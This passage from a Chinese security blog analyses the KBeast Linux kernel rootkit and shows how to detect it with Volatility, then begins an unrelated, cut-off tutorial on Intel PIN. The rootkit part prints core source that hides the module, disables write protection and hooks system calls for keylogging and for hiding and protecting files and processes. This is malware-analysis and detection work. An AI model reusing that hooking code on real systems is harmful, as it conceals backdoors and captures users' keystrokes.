+<p>成功编译后，kbeast就会加载到内核空间，rootkit安装在/usr/<em>h4x</em>路径下，生成/usr/<em>h4x</em>/_h4x_bd进程，以及acctlog 记录文件， 路径以及文件名等参数可以在config.h文件中配置。当然在目标机器guest中无法找到相关文件，因为已经被隐藏了。下文会利用volatility检测到相关进程的路径。</p>
+<h3 id="0X05-Kbeast-核心"><a href="#0X05-Kbeast-核心" class="headerlink" title="0X05 Kbeast 核心"></a>0X05 Kbeast 核心</h3><p>Kbeast以LKM的方式存在，以下是其核心代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/*init module insmod*/</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="comment">//Uncomment to hide this module</span></div><div class="line">  list_del_init(&amp;__this_module.<span class="built_in">list</span>);</div><div class="line"></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcp_seq_afinfo</span> *<span class="title">my_afinfo</span> = <span class="title">NULL</span>;</span></div><div class="line">  <span class="comment">//proc_net is disappeared in 2.6.32, use init_net.proc_net</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">my_dir_entry</span> = <span class="title">init_net</span>.<span class="title">proc_net</span>-&gt;<span class="title">subdir</span>;</span>  </div><div class="line"></div><div class="line">  write_cr0 (read_cr0 () &amp; (~ <span class="number">0x10000</span>));</div><div class="line">  <span class="keyword">if</span>(_KEYLOG_)&#123;</div><div class="line">    o_read=(<span class="keyword">void</span> *)sys_call_table[__NR_read];</div><div class="line">    sys_call_table[__NR_read]=h4x_read;</div><div class="line">  &#125;</div><div class="line">  o_write=(<span class="keyword">void</span> *)sys_call_table[__NR_write];</div><div class="line">  sys_call_table[__NR_write]=h4x_write;</div><div class="line">  <span class="meta">#<span class="meta-keyword">if</span> defined(__x86_64__)</span></div><div class="line">    o_getdents=sys_call_table [__NR_getdents];</div><div class="line">    sys_call_table [__NR_getdents]=h4x_getdents;</div><div class="line">  <span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)</span></div><div class="line">    o_getdents64=sys_call_table [__NR_getdents64];</div><div class="line">    sys_call_table [__NR_getdents64]=h4x_getdents64;</div><div class="line">  <span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">    <span class="meta">#<span class="meta-keyword">error</span> Unsupported architecture</span></div><div class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  o_unlink = sys_call_table [__NR_unlink];</div><div class="line">  sys_call_table [__NR_unlink] = h4x_unlink;</div><div class="line">  o_rmdir = sys_call_table [__NR_rmdir];</div><div class="line">  sys_call_table [__NR_rmdir] = h4x_rmdir;</div><div class="line">  o_unlinkat = sys_call_table [__NR_unlinkat];</div><div class="line">  sys_call_table [__NR_unlinkat] = h4x_unlinkat;</div><div class="line">  o_rename = sys_call_table [__NR_rename];</div><div class="line">  sys_call_table [__NR_rename] = h4x_rename;</div><div class="line">  o_open = sys_call_table [__NR_open];</div><div class="line">  sys_call_table [__NR_open] = h4x_open;</div><div class="line">  o_kill = sys_call_table [__NR_kill];</div><div class="line">  sys_call_table [__NR_kill] = h4x_kill;</div><div class="line">  o_delete_module = sys_call_table [__NR_delete_module];</div><div class="line">  sys_call_table [__NR_delete_module] = h4x_delete_module;</div><div class="line">  write_cr0 (read_cr0 () | <span class="number">0x10000</span>);</div><div class="line"></div><div class="line">  <span class="keyword">while</span>(<span class="built_in">strcmp</span>(my_dir_entry-&gt;name, <span class="string">"tcp"</span>))</div><div class="line">    my_dir_entry = my_dir_entry-&gt;next;</div><div class="line">  <span class="keyword">if</span>((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry-&gt;data))</div><div class="line">  &#123;</div><div class="line">    <span class="comment">//seq_show is disappeared in 2.6.32, use seq_ops.show</span></div><div class="line">    old_tcp4_seq_show = my_afinfo-&gt;seq_ops.show;</div><div class="line">    my_afinfo-&gt;seq_ops.show = h4x_tcp4_seq_show;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>首先将模块隐藏，取消CR0写保护，找到系统调用表地址，将其处理函数换成自己的函数，分别对应其中的特性。 如：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">sys_call_table[__NR_read]=h4x_read; <span class="comment">// log key</span></div><div class="line">sys_call_table[__NR_write]=h4x_write; <span class="comment">// fake output ps,pstree,top,lsof</span></div><div class="line">sys_call_table [__NR_getdents]=h4x_getdents; <span class="comment">//hide file and directory</span></div><div class="line">sys_call_table [__NR_unlink] = h4x_unlink; <span class="comment">//Don't allow your file to be removed</span></div><div class="line">sys_call_table [__NR_rmdir] = h4x_rmdir; <span class="comment">//Don't allow your directory to be removed</span></div><div class="line">sys_call_table [__NR_unlinkat] = h4x_unlinkat; <span class="comment">//Don't allow your file and directory to be removed </span></div><div class="line">sys_call_table [__NR_rename] = h4x_rename; <span class="comment">//Don't allow your file to be renamed/moved</span></div><div class="line">sys_call_table [__NR_open] = h4x_open; <span class="comment">//Don't allow your file to be overwrited</span></div><div class="line">sys_call_table [__NR_kill] = h4x_kill; <span class="comment">//Don't allow your process to be killed</span></div><div class="line">sys_call_table [__NR_delete_module] = h4x_delete_module;</div></pre></td></tr></table></figure>
+<h3 id="0X06-Libvmi-and-Volatility检测KBeast"><a href="#0X06-Libvmi-and-Volatility检测KBeast" class="headerlink" title="0X06 Libvmi and Volatility检测KBeast"></a>0X06 Libvmi and Volatility检测KBeast</h3><p>检测之前，先按照 <a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">这篇</a> 文章搭好环境。</p>
+<p>以下是分别利用volatility的linux_psaux、linux_pslist、linux_pstree、linux_lsof、linux_proc_maps、linux_check_modules插件检测出来的结果，能检测出其隐藏的进程、模块、进程间的关系以及所在路径。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_psaux | grep _h4x_bd</div><div class="line">  </div><div class="line">Pid    Uid    Gid    Arguments </div><div class="line"><span class="number">2316</span>   <span class="number">2</span>      <span class="number">2</span>      ./_h4x_bd</div><div class="line"></div><div class="line"> python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslist | grep _h4x_bd </div><div class="line"> </div><div class="line"> Offset     Name                 Pid             Uid             Gid    DTB      Start Time</div><div class="line"> <span class="number">0xf579e680</span> _h4x_bd              <span class="number">2316</span>            <span class="number">2</span>               <span class="number">2</span>      <span class="number">0x357c5000</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-01</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">29</span> UTC+<span class="number">0000</span></div><div class="line">  </div><div class="line">  </div><div class="line">  python vol.py -l vmi://<span class="number">1004</span>desktop32         --profile=Linuxubuntu1004desktopx86 linux_pstree | grep _h4x_bd </div><div class="line"></div><div class="line"> Name                 Pid             Uid </div><div class="line"> ._h4x_bd             <span class="number">2316</span>            <span class="number">2</span> </div><div class="line">  </div><div class="line"> python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslsof | grep _h4x_bd </div><div class="line">  </div><div class="line">  Offset             Name                           Pid      FD       Path</div><div class="line">  <span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">1</span> /dev/pts/<span class="number">0</span></div><div class="line"><span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">2</span> /dev/pts/<span class="number">0</span></div><div class="line"><span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">3</span> socket:[<span class="number">11708</span>]</div><div class="line"></div><div class="line">python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_proc_maps | grep _h4x_bd </div><div class="line">  </div><div class="line">  </div><div class="line"> linux_proc_maps</div><div class="line"> </div><div class="line"> </div><div class="line"> Offset             Pid      Name                 Start              End         </div><div class="line">       Flags       Pgoff Major  Minor  Inode      File Path</div><div class="line"></div><div class="line"> </div><div class="line"> </div><div class="line"> </div><div class="line"> <span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd                  <span class="number">0x0000000000adb000</span> <span class="number">0x0000000000adc000</span> ---      <span class="number">0x153000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000adc000</span> <span class="number">0x0000000000ade000</span> r--      <span class="number">0x153000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000ade000</span> <span class="number">0x0000000000adf000</span> rw-      <span class="number">0x155000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000adf000</span> <span class="number">0x0000000000ae2000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000008048000</span> <span class="number">0x0000000008049000</span> r-x           <span class="number">0x0</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000008049000</span> <span class="number">0x000000000804a000</span> r--        <span class="number">0x1000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x000000000804a000</span> <span class="number">0x000000000804b000</span> rw-        <span class="number">0x2000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000b7875000</span> <span class="number">0x00000000b7876000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000b7884000</span> <span class="number">0x00000000b7886000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000bfd84000</span> <span class="number">0x00000000bfd99000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> [stack]</div><div class="line"></div><div class="line">  python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_check_moudles | grep _h4x_bd   </div><div class="line">   </div><div class="line"> Module Address Module Name             </div><div class="line"> <span class="number">0xf805dae0</span> ipsecs_kbeast_v1</div></pre></td></tr></table></figure>
+<p> 当要清除module时，执行./setup clean. 但仍然会残留一些文件，无法删除。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Checking <span class="keyword">for</span> make : /usr/bin/make</div><div class="line">Removing Kernel Module</div><div class="line">Removing Compiled Kernel Module</div><div class="line">Stoping Network Daemon</div><div class="line">Removing Backdoor File</div><div class="line">rm: cannot remove `./_h4x_bd': Permission denied</div><div class="line">Removing Installation Directory</div><div class="line">rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.o.cmd':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.o':         Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.ko.cmd':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.ko':         Permission denied</div><div class="line">rm: cannot remove                     `/usr/_h4x_/.tmp_versions/ipsecs-kbeast-v1.mod': Permission     denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.c':         Permission denied</div><div class="line">rm: cannot remove         `/usr/_h4x_/.ipsecs-kbeast-v1.mod.o.cmd': Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.c':         Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/bd-ipsecs-kbeast-v1.c':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.o':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.cc1':     Permission denied</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html" target="_blank" rel="external">http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html</a></p>
+<p><a href="http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf" target="_blank" rel="external">http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf</a></p>
+<p><a href="https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/" target="_blank" rel="external">https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/</a> </p>
+<p><a href="http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/" target="_blank" rel="external">http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/</a></p>
+<p><a href="http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html" target="_blank" rel="external">http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kbeastanalysis/" target="_blank" rel="external">内核层恶意代码KBeast分析与检测</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Systemcall/">Systemcall</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-pinintro" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/04/pinintro/">二进制代码注入PIN</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/01/04/pinintro/" class="article-date">
+  <time datetime="2017-01-04T06:16:14.000Z" itemprop="datePublished">2017-01-04</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/二进制分析/">二进制分析</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2015/12/19/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">个人博客</a>，讲述如何利用PIN进行二进制代码注入，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<hr>
+<blockquote>
+<ul>
+<li>什么是注入（Instrumentation)</li>
+<li>PIN初探</li>
+<li>PIN框架</li>
+<li>Pintools Example</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="什么是注入（Instrumentation"><a href="#什么是注入（Instrumentation" class="headerlink" title="什么是注入（Instrumentation)"></a>什么是注入（Instrumentation)</h2><p>每一个写过代码的人都调试过程序，最简单的无非就是手动在源代码中插入printf语句，当然大部分还是会选择一些调试工具如GDB。注入技术也类似，不过注入的对象是可执行二进制文件。简单来说，在你的程序中插入额外的代码来分析程序的运行时信息就称为注入技术。但就广义来说，在源代码中注入代码也可称之为注入，只是为了区分，注入技术一般特指对象为可执行二进制文件。</p>
+<p>进一步说明，注入一般又分为静态二进制注入（Static Binary Instrumentation) 与动态二进制注入 （Dynamic Binary Instrumentation). 看定义可知，SBI技术工作在程序运行前，DBI则工作在运行过程中。相比SBI，DBI技术有以下优势：</p>
+<ul>
+<li>不需要重新编译、重新链接</li>
+<li>在运行时发现代码</li>
+<li>能处理动态产生的代码</li>
+<li>能附加到正在运行时的进程中</li>
+</ul>
+<p>目前，研究较多的都属DBI技术，前文提到，DBI的工作方式有点类似编译器，只不过分析例程（analysis routine)是可编程化的。DBI技术广泛应用在程序分析中，如逆向工程（reverse engineering), 程序调试（program debug)， 恶意代码分析（malware analysis)等。</p>
+<h2 id="Pin初探"><a href="#Pin初探" class="headerlink" title="Pin初探"></a>Pin初探</h2><p>对DBI技术有个大致了解之后，进入本文主题,  Pin是Intel 与University of Colorado合作研究出的一款用来动态分析二进制程序的注入工具，发表在系统顶会PLDI’2005,有兴趣的可以读读这篇文章，其它DBI技术还有Valgrind, DYNAMORIO, QEMU.</p>
+<p>开门见山，首先来看一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">    counter++;</div><div class="line">             sub  $0xff, %edx</div><div class="line">    counter++;</div><div class="line">             cmp  %esi, %edx</div><div class="line">    counter++;</div><div class="line">             jle &lt;L1&gt;</div><div class="line">    counter++;</div><div class="line">             mov  $0x1, %edi</div><div class="line">    counter++;</div><div class="line">             add  $0x10, %eax</div><div class="line">```             </div><div class="line"></div><div class="line">这段代码很简单，只是在每条指令前加了一个计数器</div><div class="line">那么如果使用PIN, 该如何实现？ 看下面代码：</div><div class="line"></div><div class="line">``` C</div><div class="line">#include &lt;iostream&gt;</div><div class="line">#include &quot;pin.h&quot;</div><div class="line"></div><div class="line">UINT64 icount = 0;</div><div class="line"></div><div class="line">void docount() &#123; icount++; &#125;</div><div class="line">    </div><div class="line">void Instruction(INS ins, void *v) </div><div class="line">&#123;</div><div class="line">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Fini(INT32 code, void *v) </div><div class="line">&#123; std::cerr &lt;&lt; &quot;Count &quot; &lt;&lt; icount &lt;&lt; endl; &#125;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    PIN_Init(argc, argv);</div><div class="line">    INS_AddInstrumentFunction(Instruction, 0);</div><div class="line">    PIN_AddFiniFunction(Fini, 0);</div><div class="line">    PIN_StartProgram();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>现在对这段实现代码一一解释：<br><code>void docount() {icount+;}</code> 用户可自定义<code>docount()</code> 函数，PIN称之为分析例程 （Analysis routine),先对这个概念保持一点印象。再看void Instruction（）函数，PIN 称之为注入例程（Instrumentation routine), 关注其中两个参数，<code>IPOINT_BEFORE</code> 表示在每条指令之前执行，<code>（AFUNPTR)docount</code>便是要注入的分析例程。<code>main()</code> 函数调用<code>INS_AddInstrumentFunction（Instruction,0)</code>,便会触发注入例程以及分析例程，这些参数都可以根据自己需求修改。<br>只需这么几行简单的代码，PIN便能帮你分析正在运行的二进制文件执行过的指令条数了。这么简单？ PIN只能做这些吗？ 当然不是！ 下文再介绍一些PIN的框架以及使用过程。</p>
+<p>##PIN框架<br>可以把PIN理解为实时编译器（just in time complier).只不过输入进PIN的不是二进制代码，而是可执行的二进制文件，PIN能拦截可执行文件的第一条指令，然后从这条指令开始产生新的代码序列，之后将控制权交给产生的代码序列，此刻用户就有机会注入自己的代码，这个过程就是Instrumentation.<br>如果你只想使用PIN来分析自己的二进制代码，内部实现原理 (可阅读PLDI’2005)大可不必关心，关注的应该是PIN为用户提供的上层接口，使用这个接口来编写自己的Pintools. 版权原因，本文也不会深入去介绍PIN是如何实现的。</p>
+<p>下面就来聊聊这个Pintools. Pintools实际上就是用户要实现的Instrumentation过程，可以把Pintools想象成能修改内部PIN的代码产生过程的插件（Plugins),PIN官网会提供一些sample教你怎么写Pintools,大部分还得靠用户自己去写。<br>总的来说，instrumentation包括两个部分：</p>
+<ul>
+<li>第一，决定在哪注入代码，注入什么代码的一种机制</li>
+<li>第二，在注入点要执行的代码</li>
+</ul>
+<p>第一个部分被称之为 <strong>instrumentation routine</strong>,第二个部分被称之为 <strong>analysis routine</strong>. Pintools会向PIN注册一个注入回调函数，如上文提到的<code>INS_AddInstrumentFunction（）</code>，该函数会代表instrumentation routine观察要产生的代码，分析代码的静态属性，来决定是否以及在哪里调用analysis routine. Analysis routine再收集被分析程序的数据。</p>
+<p>注意，前文中的例子对每条指令分析，带来的开销太大，因此，PIN提供不同的粒度对程序进行分析，供用户根据不同需求选择：</p>
+<ul>
+<li>Instruction</li>
+<li>Basic block: 包含一些指令序列，终止于控制流改变指令;单入口单出口。</li>
+<li>Trace:包含一些Basic block序列，终止于无条件控制流改变指令；单入口多出口。 </li>
+</ul>
+<p>##Pintools example<br>最后，以一个Pintools 的完整例子结束本文</p>
+ <figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pin.H"</span></span></div><div class="line"></div><div class="line">ofstream OutFile;</div><div class="line"></div><div class="line"><span class="comment">// The running count of instructions is kept here</span></div><div class="line"><span class="comment">// make it static to help the compiler optimize docount</span></div><div class="line"><span class="keyword">static</span> UINT64 icount = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// This function is called before every instruction is      executed</span></div><div class="line"><span class="function">VOID <span class="title">docount</span><span class="params">()</span> </span>&#123; icount++; &#125;</div><div class="line"></div><div class="line"><span class="comment">// Pin calls this function every time a new instruction     is encountered</span></div><div class="line"><span class="function">VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID *v)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">// Insert a call to docount before every            instruction, no arguments are passed</span></div><div class="line">  INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">KNOB&lt;<span class="built_in">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class="string">"pintool"</span>,</div><div class="line"><span class="string">"o"</span>, <span class="string">"inscount.out"</span>, <span class="string">"specify output file name"</span>);</div><div class="line"></div><div class="line"><span class="comment">// This function is called when the application exits</span></div><div class="line"><span class="function">VOID <span class="title">Fini</span><span class="params">(INT32 code, VOID *v)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">// Write to a file since cout and cerr maybe closed     by the application</span></div><div class="line">  OutFile.setf(ios::showbase);</div><div class="line">  OutFile &lt;&lt; <span class="string">"Count "</span> &lt;&lt; icount &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">  OutFile.close();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Print Help Message                                                        */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function">INT32 <span class="title">Usage</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="string">"This tool counts the number of dynamic          instructions executed"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt;      <span class="built_in">endl</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Main                                                                      */</span></div><div class="line"><span class="comment">/* =====================================================     